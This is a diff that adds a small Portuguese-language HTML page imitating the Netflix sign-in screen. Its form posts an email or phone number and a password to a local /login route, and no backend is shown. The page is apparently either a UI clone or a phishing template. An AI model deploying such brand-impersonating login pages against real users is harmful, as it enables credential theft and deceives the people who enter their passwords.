@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<title>Netflix</title>
+<style>
+    body { background: black; color: white; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; background-image: linear-gradient(rgba(0,0,0,0.5),rgba(0,0,0,0.5)); }
+    .box { background: rgba(0,0,0,0.75); padding: 60px 68px 40px; border-radius: 4px; width: 300px; }
+    h1 { color: #e50914; font-size: 32px; margin-bottom: 20px; }
+    h2 { font-size: 32px; margin-bottom: 28px; }
+    input { background: #333; border-radius: 4px; border: 0; color: #fff; height: 50px; line-height: 50px; padding: 0 20px; width: 100%; margin-bottom: 16px; box-sizing: border-box; }
+    button { background: #e50914; color: white; border-radius: 4px; border: 0; font-size: 16px; font-weight: 700; margin: 24px 0 12px; padding: 16px; width: 100%; cursor: pointer; }
+</style>
+</head>
+<body>
+    <div class="box">
+        <h1>NETFLIX</h1>
+        <h2>Entrar</h2>
+        <form action="/login" method="POST">
+            <input type="text" name="user" placeholder="Email ou número de telefone">
+            <input type="password" name="password" placeholder="Senha">
+            <button type="submit">Entrar</button>
+        </form>
+    </div>
+</body>
+</html>
